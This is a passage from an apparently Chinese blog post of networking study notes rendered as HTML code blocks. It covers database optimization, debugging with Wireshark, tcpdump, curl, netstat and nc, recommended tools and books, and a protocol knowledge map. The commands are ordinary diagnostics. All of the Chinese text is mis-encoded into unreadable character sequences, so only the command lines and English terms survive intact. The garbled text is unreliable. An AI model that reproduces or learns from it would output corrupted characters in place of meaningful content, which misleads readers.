å†…è”å°èµ„æº<br><br><span class="hljs-bullet">4.</span> å¼‚æ­¥åŠ è½½<br><span class="hljs-bullet">   -</span> deferã€async<br><span class="hljs-bullet">   -</span> æ‡’åŠ è½½<br><span class="hljs-bullet">   -</span> æŒ‰éœ€åŠ è½½<br></code></pre></td></tr></table></figure><h3 id="3-3-æ•°æ®åº“ä¼˜åŒ–"><a href="#3-3-æ•°æ®åº“ä¼˜åŒ–" class="headerlink" title="3.3 æ•°æ®åº“ä¼˜åŒ–"></a>3.3 æ•°æ®åº“ä¼˜åŒ–</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> ç´¢å¼•ä¼˜åŒ–<br><span class="hljs-bullet">   -</span> åˆç†åˆ›å»ºç´¢å¼•<br><span class="hljs-bullet">   -</span> é¿å…è¿‡åº¦ç´¢å¼•<br><span class="hljs-bullet">   -</span> å®šæœŸç»´æŠ¤<br><br><span class="hljs-bullet">2.</span> æŸ¥è¯¢ä¼˜åŒ–<br><span class="hljs-bullet">   -</span> é¿å…SELECT *<br><span class="hljs-bullet">   -</span> ä½¿ç”¨LIMIT<br><span class="hljs-bullet">   -</span> é¿å…N+1æŸ¥è¯¢<br><br><span class="hljs-bullet">3.</span> è¿æ¥æ± <br><span class="hljs-bullet">   -</span> å¤ç”¨è¿æ¥<br><span class="hljs-bullet">   -</span> é™åˆ¶æœ€å¤§è¿æ¥<br><br><span class="hljs-bullet">4.</span> è¯»å†™åˆ†ç¦»<br><span class="hljs-bullet">   -</span> ä¸»ä»å¤åˆ¶<br><span class="hljs-bullet">   -</span> åˆ†æ•£è´Ÿè½½<br></code></pre></td></tr></table></figure><hr><h2 id="4-è°ƒè¯•å’Œæ’é”™"><a href="#4-è°ƒè¯•å’Œæ’é”™" class="headerlink" title="4. è°ƒè¯•å’Œæ’é”™"></a>4. è°ƒè¯•å’Œæ’é”™</h2><h3 id="4-1-ç½‘ç»œæŠ“åŒ…å·¥å…·"><a href="#4-1-ç½‘ç»œæŠ“åŒ…å·¥å…·" class="headerlink" title="4.1 ç½‘ç»œæŠ“åŒ…å·¥å…·"></a>4.1 ç½‘ç»œæŠ“åŒ…å·¥å…·</h3><p><strong>Wireshark</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ä½¿ç”¨åœºæ™¯ï¼š<br><span class="hljs-bullet">-</span> åˆ†æç½‘ç»œæµé‡<br><span class="hljs-bullet">-</span> æŸ¥çœ‹æ•°æ®åŒ…è¯¦æƒ…<br><span class="hljs-bullet">-</span> è¯Šæ–­ç½‘ç»œé—®é¢˜<br><br>å¸¸ç”¨è¿‡æ»¤å™¨ï¼š<br>tcp.port == 80              # HTTPæµé‡<br>tcp.port == 443             # HTTPSæµé‡<br>http.request.method == GET  # GETè¯·æ±‚<br>ip.addr == 192.168.1.100    # ç‰¹å®šIP<br><br>æ“ä½œæ­¥éª¤ï¼š<br><span class="hljs-bullet">1.</span> é€‰æ‹©ç½‘ç»œæ¥å£<br><span class="hljs-bullet">2.</span> å¼€å§‹æ•è·<br><span class="hljs-bullet">3.</span> åº”ç”¨è¿‡æ»¤å™¨<br><span class="hljs-bullet">4.</span> åˆ†ææ•°æ®åŒ…<br><span class="hljs-bullet">5.</span> å¯¼å‡ºæ•°æ®<br></code></pre></td></tr></table></figure><p><strong>tcpdump</strong>ï¼š</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pf">åŸºæœ¬ç”¨æ³•ï¼š<br><span class="hljs-comment"># æ•è·æŒ‡å®šç«¯å£</span><br>sudo tcpdump -i <span class="hljs-literal">any</span> <span class="hljs-keyword">port</span> <span class="hljs-number">80</span><br><br><span class="hljs-comment"># ä¿å­˜åˆ°æ–‡ä»¶</span><br>sudo tcpdump -i <span class="hljs-literal">any</span> <span class="hljs-keyword">port</span> <span class="hljs-number">80</span> -w capture.pcap<br><br><span class="hljs-comment"># è¯»å–æ–‡ä»¶</span><br>tcpdump -r capture.pcap<br><br><span class="hljs-comment"># è¿‡æ»¤ä¸»æœº</span><br>sudo tcpdump -i <span class="hljs-literal">any</span> host <span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span><br><br><span class="hljs-comment"># è¯¦ç»†è¾“å‡º</span><br>sudo tcpdump -i <span class="hljs-literal">any</span> <span class="hljs-keyword">port</span> <span class="hljs-number">80</span> -v -X<br></code></pre></td></tr></table></figure><h3 id="4-2-å‘½ä»¤è¡Œå·¥å…·"><a href="#4-2-å‘½ä»¤è¡Œå·¥å…·" class="headerlink" title="4.2 å‘½ä»¤è¡Œå·¥å…·"></a>4.2 å‘½ä»¤è¡Œå·¥å…·</h3><p><strong>curl</strong>ï¼š</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs q">åŸºæœ¬è¯·æ±‚ï¼š<br>curl http:<span class="hljs-comment">//example.com</span><br><br>æ˜¾ç¤ºå¤´éƒ¨ï¼š<br>curl -I http:<span class="hljs-comment">//example.com</span><br><br>POSTè¯·æ±‚ï¼š<br>curl -X POST -d &#x27;&#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;value&quot;</span>&#125;&#x27; \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  http:<span class="hljs-comment">//example.com/api</span><br><br>HTTPSè¯·æ±‚ï¼š<br>curl -k https:<span class="hljs-comment">//localhost:8443</span><br><br>è·Ÿéšé‡å®šå‘ï¼š<br>curl -L http:<span class="hljs-comment">//example.com</span><br><br>æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼š<br>curl -v http:<span class="hljs-comment">//example.com</span><br><br>æµ‹è¯•é€Ÿåº¦ï¼š<br>curl -w <span class="hljs-string">&quot;@curl-format.txt&quot;</span> -o /<span class="hljs-built_in">dev</span>/<span class="hljs-built_in">null</span> -s http:<span class="hljs-comment">//example.com</span><br></code></pre></td></tr></table></figure><p><strong>netstat &#x2F; ss</strong>ï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">æŸ¥çœ‹æ‰€æœ‰è¿æ¥ï¼š<br>netstat -<span class="hljs-keyword">an</span><br>ss -<span class="hljs-keyword">an</span><br><br>æŸ¥çœ‹ç›‘å¬ç«¯å£ï¼š<br>netstat -lntp<br>ss -lntp<br><br>æŸ¥çœ‹TCPè¿æ¥ï¼š<br>netstat -nt<br>ss -nt<br><br>æŸ¥çœ‹è¿æ¥æ•°é‡ï¼š<br>netstat -<span class="hljs-keyword">an</span> | grep ESTABLISHED | wc -l<br>ss -s<br><br>æŸ¥çœ‹æŸç«¯å£è¿æ¥ï¼š<br>netstat -<span class="hljs-keyword">an</span> | grep :<span class="hljs-number">80</span><br>ss -<span class="hljs-built_in">tan</span> | grep :<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p><strong>telnet &#x2F; nc</strong>ï¼š</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs maxima">æµ‹è¯•ç«¯å£ï¼š<br>telnet <span class="hljs-built_in">example</span>.com <span class="hljs-number">80</span><br>nc -zv <span class="hljs-built_in">example</span>.com <span class="hljs-number">80</span><br><br>å‘é€HTTPè¯·æ±‚ï¼š<br>telnet <span class="hljs-built_in">example</span>.com <span class="hljs-number">80</span><br>GET / HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-built_in">example</span>.com<br>[ç©ºè¡Œ]<br><br>ç›‘å¬ç«¯å£ï¼š<br>nc -l <span class="hljs-number">8080</span><br><br>ç«¯å£è½¬å‘ï¼š<br>nc -l <span class="hljs-number">8080</span> | nc <span class="hljs-built_in">example</span>.com <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><h3 id="4-3-è°ƒè¯•æŠ€å·§"><a href="#4-3-è°ƒè¯•æŠ€å·§" class="headerlink" title="4.3 è°ƒè¯•æŠ€å·§"></a>4.3 è°ƒè¯•æŠ€å·§</h3><p><strong>æ—¥å¿—åˆ†æ</strong>ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æ—¥å¿—çº§åˆ«ï¼š<br><span class="hljs-built_in">DEBUG</span> &lt; <span class="hljs-built_in">INFO</span> &lt; <span class="hljs-built_in">WARNING</span> &lt; <span class="hljs-built_in">ERROR</span> &lt; CRITICAL<br><br>æ—¥å¿—å†…å®¹ï¼š<br>- æ—¶é—´æˆ³<br>- çº§åˆ«<br>- æ¨¡å—<br>- æ¶ˆæ¯<br>- å¼‚å¸¸å †æ ˆ<br><br>ç¤ºä¾‹ï¼š<br>[2024-01-15 10:30:45] <span class="hljs-built_in">INFO</span> [server]<span class="hljs-built_in"> Client </span>connected: 192.168.1.100:54321<br>[2024-01-15 10:30:45] <span class="hljs-built_in">DEBUG</span> [handler] Request: <span class="hljs-built_in">GET</span> /api<span class="hljs-built_in">/users</span><br><span class="hljs-built_in"></span>[2024-01-15 10:30:46] <span class="hljs-built_in">ERROR</span> [database]<span class="hljs-built_in"> Connection </span>failed: timeout<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½åˆ†æ</strong>ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs vim">Python profilingï¼š<br><span class="hljs-keyword">python</span> -<span class="hljs-keyword">m</span> cProfile -<span class="hljs-keyword">o</span> <span class="hljs-keyword">profile</span>.out script.<span class="hljs-keyword">py</span><br><span class="hljs-keyword">python</span> -<span class="hljs-keyword">m</span> pstats <span class="hljs-keyword">profile</span>.out<br><br>å†…å­˜åˆ†æï¼š<br>memory_profiler<br>objgraph<br><br>ç½‘ç»œæ€§èƒ½ï¼š<br>ping - æµ‹è¯•å»¶è¿Ÿ<br>traceroute - è¿½è¸ªè·¯ç”±<br>iperf - æµ‹è¯•å¸¦å®½<br><span class="hljs-keyword">ab</span> - HTTPå‹åŠ›æµ‹è¯•<br>wrk - ç°ä»£åŒ–å‹åŠ›æµ‹è¯•<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é—®é¢˜æ’æŸ¥</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">è¿æ¥è¢«æ‹’ç»ï¼š<br><span class="hljs-bullet">- </span>æ£€æŸ¥æœåŠ¡æ˜¯å¦å¯åŠ¨<br><span class="hljs-bullet">- </span>æ£€æŸ¥ç«¯å£æ˜¯å¦æ­£ç¡®<br><span class="hljs-bullet">- </span>æ£€æŸ¥é˜²ç«å¢™è§„åˆ™<br><br>è¿æ¥è¶…æ—¶ï¼š<br><span class="hljs-bullet">- </span>æ£€æŸ¥ç½‘ç»œè¿é€šæ€§<br><span class="hljs-bullet">- </span>æ£€æŸ¥è·¯ç”±<br><span class="hljs-bullet">- </span>æ£€æŸ¥é˜²ç«å¢™<br><br>è¿æ¥é‡ç½®ï¼š<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨ä¸»åŠ¨å…³é—­<br><span class="hljs-bullet">- </span>é˜²ç«å¢™æ‹¦æˆª<br><span class="hljs-bullet">- </span>ä»£ç†é—®é¢˜<br><br>æ…¢æŸ¥è¯¢ï¼š<br><span class="hljs-bullet">- </span>ç½‘ç»œå»¶è¿Ÿé«˜<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨è´Ÿè½½é«˜<br><span class="hljs-bullet">- </span>æ•°æ®åº“æ…¢æŸ¥è¯¢<br><span class="hljs-bullet">- </span>é”ç«äº‰<br><br>å†…å­˜æ³„æ¼ï¼š<br><span class="hljs-bullet">- </span>ä½¿ç”¨å†…å­˜åˆ†æå·¥å…·<br><span class="hljs-bullet">- </span>æ£€æŸ¥å¾ªç¯å¼•ç”¨<br><span class="hljs-bullet">- </span>æ£€æŸ¥èµ„æºé‡Šæ”¾<br></code></pre></td></tr></table></figure><hr><h2 id="5-å·¥å…·å’Œèµ„æºæ¨è"><a href="#5-å·¥å…·å’Œèµ„æºæ¨è" class="headerlink" title="5. å·¥å…·å’Œèµ„æºæ¨è"></a>5. å·¥å…·å’Œèµ„æºæ¨è</h2><h3 id="5-1-å¼€å‘å·¥å…·"><a href="#5-1-å¼€å‘å·¥å…·" class="headerlink" title="5.1 å¼€å‘å·¥å…·"></a>5.1 å¼€å‘å·¥å…·</h3><p><strong>ä»£ç ç¼–è¾‘å™¨</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs markdown">VS Codeï¼š<br><span class="hljs-bullet">-</span> å…è´¹å¼€æº<br><span class="hljs-bullet">-</span> æ’ä»¶ä¸°å¯Œ<br><span class="hljs-bullet">-</span> æ¨èæ’ä»¶ï¼š<br><span class="hljs-bullet">  -</span> Python<br><span class="hljs-bullet">  -</span> Remote SSH<br><span class="hljs-bullet">  -</span> REST Client<br><span class="hljs-bullet">  -</span> GitLens<br><br>PyCharmï¼š<br><span class="hljs-bullet">-</span> ä¸“ä¸šPython IDE<br><span class="hljs-bullet">-</span> å¼ºå¤§çš„è°ƒè¯•åŠŸèƒ½<br><span class="hljs-bullet">-</span> æ•°æ®åº“å·¥å…·<br><br>Vimï¼š<br><span class="hljs-bullet">-</span> è½»é‡çº§<br><span class="hljs-bullet">-</span> é«˜æ•ˆç¼–è¾‘<br><span class="hljs-bullet">-</span> æœåŠ¡å™¨å¿…å¤‡<br></code></pre></td></tr></table></figure><p><strong>APIæµ‹è¯•å·¥å…·</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Postmanï¼š<br><span class="hljs-bullet">- </span>åŠŸèƒ½å¼ºå¤§<br><span class="hljs-bullet">- </span>å›¢é˜Ÿåä½œ<br><span class="hljs-bullet">- </span>è‡ªåŠ¨åŒ–æµ‹è¯•<br><br>Insomniaï¼š<br><span class="hljs-bullet">- </span>ç®€æ´ç•Œé¢<br><span class="hljs-bullet">- </span>æ”¯æŒGraphQL<br><span class="hljs-bullet">- </span>å¼€æº<br><br>curlï¼š<br><span class="hljs-bullet">- </span>å‘½ä»¤è¡Œ<br><span class="hljs-bullet">- </span>è„šæœ¬å‹å¥½<br><span class="hljs-bullet">- </span>é€šç”¨æ€§å¼º<br><br>httpieï¼š<br><span class="hljs-bullet">- </span>ç”¨æˆ·å‹å¥½<br><span class="hljs-bullet">- </span>å½©è‰²è¾“å‡º<br><span class="hljs-bullet">- </span>ç®€å•è¯­æ³•<br></code></pre></td></tr></table></figure><p><strong>ç½‘ç»œå·¥å…·</strong>ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">Wiresharkï¼šåŒ…åˆ†æ<br>tcpdumpï¼šæŠ“åŒ…<br><span class="hljs-keyword">nmap</span>ï¼šç«¯å£æ‰«æ<br>netcatï¼šç½‘ç»œè°ƒè¯•<br>iperfï¼šæ€§èƒ½æµ‹è¯•<br>mtrï¼šè·¯ç”±è¿½è¸ª<br></code></pre></td></tr></table></figure><h3 id="5-2-å­¦ä¹ èµ„æº"><a href="#5-2-å­¦ä¹ èµ„æº" class="headerlink" title="5.2 å­¦ä¹ èµ„æº"></a>5.2 å­¦ä¹ èµ„æº</h3><p><strong>ä¹¦ç±æ¨è</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç½‘ç»œåè®®ï¼š<br><span class="hljs-bullet">- </span>ã€ŠTCP/IPè¯¦è§£ å·1ã€‹<br><span class="hljs-bullet">- </span>ã€Šè®¡ç®—æœºç½‘ç»œï¼šè‡ªé¡¶å‘ä¸‹æ–¹æ³•ã€‹<br><span class="hljs-bullet">- </span>ã€ŠHTTPæƒå¨æŒ‡å—ã€‹<br><br>ç¼–ç¨‹å®è·µï¼š<br><span class="hljs-bullet">- </span>ã€ŠUnixç½‘ç»œç¼–ç¨‹ã€‹<br><span class="hljs-bullet">- </span>ã€Šé«˜æ€§èƒ½ç½‘ç»œç¼–ç¨‹ã€‹<br><span class="hljs-bullet">- </span>ã€ŠWebæ€§èƒ½æƒå¨æŒ‡å—ã€‹<br><br>å®‰å…¨ï¼š<br><span class="hljs-bullet">- </span>ã€Šç™½å¸½å­è®²Webå®‰å…¨ã€‹<br><span class="hljs-bullet">- </span>ã€ŠWebåº”ç”¨å®‰å…¨æƒå¨æŒ‡å—ã€‹<br><span class="hljs-bullet">- </span>ã€Šå¯†ç å­¦åŸç†ä¸å®è·µã€‹<br></code></pre></td></tr></table></figure><p><strong>åœ¨çº¿èµ„æº</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æ–‡æ¡£ï¼š<br><span class="hljs-bullet">- </span>MDN Web Docs<br><span class="hljs-bullet">- </span>Pythonå®˜æ–¹æ–‡æ¡£<br><span class="hljs-bullet">- </span>RFCæ–‡æ¡£<br><br>åšå®¢ï¼š<br><span class="hljs-bullet">- </span>High Scalability<br><span class="hljs-bullet">- </span>Cloudflare Blog<br><span class="hljs-bullet">- </span>Google Developers<br><br>è§†é¢‘ï¼š<br><span class="hljs-bullet">- </span>YouTubeæŠ€æœ¯é¢‘é“<br><span class="hljs-bullet">- </span>BilibiliæŠ€æœ¯åŒº<br><span class="hljs-bullet">- </span>Udemyè¯¾ç¨‹<br><br>å®è·µï¼š<br><span class="hljs-bullet">- </span>GitHubå¼€æºé¡¹ç›®<br><span class="hljs-bullet">- </span>LeetCode<br><span class="hljs-bullet">- </span>CTFæ¯”èµ›<br></code></pre></td></tr></table></figure><p><strong>å·¥å…·ç½‘ç«™</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æµ‹è¯•å·¥å…·ï¼š<br><span class="hljs-bullet">- </span>SSL Labsï¼ˆSSLæµ‹è¯•ï¼‰<br><span class="hljs-bullet">- </span>WebPageTestï¼ˆæ€§èƒ½æµ‹è¯•ï¼‰<br><span class="hljs-bullet">- </span>GTmetrixï¼ˆç½‘ç«™åˆ†æï¼‰<br><br>åœ¨çº¿å·¥å…·ï¼š<br><span class="hljs-bullet">- </span>regex101ï¼ˆæ­£åˆ™æµ‹è¯•ï¼‰<br><span class="hljs-bullet">- </span>JSON Editor Online<br><span class="hljs-bullet">- </span>Base64ç¼–è§£ç <br><br>ç›‘æ§æœåŠ¡ï¼š<br><span class="hljs-bullet">- </span>UptimeRobot<br><span class="hljs-bullet">- </span>Pingdom<br><span class="hljs-bullet">- </span>New Relic<br></code></pre></td></tr></table></figure><h3 id="5-3-å¼€æºé¡¹ç›®å­¦ä¹ "><a href="#5-3-å¼€æºé¡¹ç›®å­¦ä¹ " class="headerlink" title="5.3 å¼€æºé¡¹ç›®å­¦ä¹ "></a>5.3 å¼€æºé¡¹ç›®å­¦ä¹ </h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">WebæœåŠ¡å™¨ï¼š<br><span class="hljs-bullet">- </span>Nginxï¼ˆé«˜æ€§èƒ½HTTPæœåŠ¡å™¨ï¼‰<br><span class="hljs-bullet">- </span>Apacheï¼ˆä¼ ç»ŸWebæœåŠ¡å™¨ï¼‰<br><span class="hljs-bullet">- </span>Caddyï¼ˆç°ä»£WebæœåŠ¡å™¨ï¼‰<br><br>æ¡†æ¶ï¼š<br><span class="hljs-bullet">- </span>Flaskï¼ˆPythonå¾®æ¡†æ¶ï¼‰<br><span class="hljs-bullet">- </span>Djangoï¼ˆPythonå…¨æ ˆæ¡†æ¶ï¼‰<br><span class="hljs-bullet">- </span>Expressï¼ˆNode.jsæ¡†æ¶ï¼‰<br><br>å·¥å…·ï¼š<br><span class="hljs-bullet">- </span>curlï¼ˆHTTPå®¢æˆ·ç«¯ï¼‰<br><span class="hljs-bullet">- </span>redisï¼ˆå†…å­˜æ•°æ®åº“ï¼‰<br><span class="hljs-bullet">- </span>PostgreSQLï¼ˆå…³ç³»æ•°æ®åº“ï¼‰<br></code></pre></td></tr></table></figure><hr><h2 id="6-æœ¬å‘¨æ€»ç»“"><a href="#6-æœ¬å‘¨æ€»ç»“" class="headerlink" title="6. æœ¬å‘¨æ€»ç»“"></a>6. æœ¬å‘¨æ€»ç»“</h2><h3 id="6-1-çŸ¥è¯†åœ°å›¾"><a href="#6-1-çŸ¥è¯†åœ°å›¾" class="headerlink" title="6.1 çŸ¥è¯†åœ°å›¾"></a>6.1 çŸ¥è¯†åœ°å›¾</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">ç¬¬ä¸‰å‘¨ï¼šä¼ è¾“å±‚å’Œåº”ç”¨å±‚åè®®<br><br>ä¼ è¾“å±‚ï¼š<br>â”œâ”€ <span class="hljs-variable">TCP</span>åè®®<br>â”‚  â”œâ”€ ä¸‰æ¬¡æ¡æ‰‹<br>â”‚  â”œâ”€ å››æ¬¡æŒ¥æ‰‹<br>â”‚  â”œâ”€ å¯é ä¼ è¾“<br>â”‚  â”œâ”€ æµé‡æ§åˆ¶<br>â”‚  â””â”€ æ‹¥å¡æ§åˆ¶<br>â”‚<br>â””â”€ <span class="hljs-variable">UDP</span>åè®®<br>   â”œâ”€ æ— è¿æ¥<br>   â”œâ”€ ä¸å¯é <br>   â””â”€ å¿«é€Ÿ<br><br>åº”ç”¨å±‚ï¼š<br>â”œâ”€ <span class="hljs-variable">HTTP</span>åè®®<br>â”‚  â”œâ”€ è¯·æ±‚<span class="hljs-operator">/</span>å“åº”<br>â”‚  â”œâ”€ æ–¹æ³•<br>â”‚  â”œâ”€ çŠ¶æ€ç <br>â”‚  â””â”€ <span class="hljs-variable">Cookie</span><span class="hljs-operator">/</span><span class="hljs-variable">Session</span><br>â”‚<br>â””â”€ <span class="hljs-variable">HTTPS</span>åè®®<br>   â”œâ”€ <span class="hljs-variable">TLS</span><span class="hljs-operator">/</span><span class="hljs-variable">SSL</span><br>   â”œâ”€ åŠ å¯†<br>   â”œâ”€ è¯ä¹¦<br>   â””â”€ å®‰å…¨<br><br>ç¼–ç¨‹å®è·µï¼š<br>â”œâ”€ <span class="hljs-built_in">Socket</span>ç¼–ç¨‹<br>â”‚  â”œâ”€ <span class="hljs-variable">TCP</span> <span class="hljs-built_in">Socket</span><br>â”‚  â”œâ”€ <span class="hljs-variable">UDP</span> <span class="hljs-built_in">Socket</span><br>â”‚  â””â”€ <span class="hljs-variable">IO</span>å¤šè·¯å¤ç”¨<br>â”‚<br>â””â”€ <span class="hljs-variable">Web</span>å¼€å‘<br>   â”œâ”€ <span class="hljs-variable">HTTP</span>æœåŠ¡å™¨<br>   â”œâ”€ <span class="hljs-variable">HTTPS</span>æœåŠ¡å™¨<br>   â””â”€ å®‰å…¨å®è·µ<br></code></pre></td></tr></table></figure><h3 id="6-2-æ 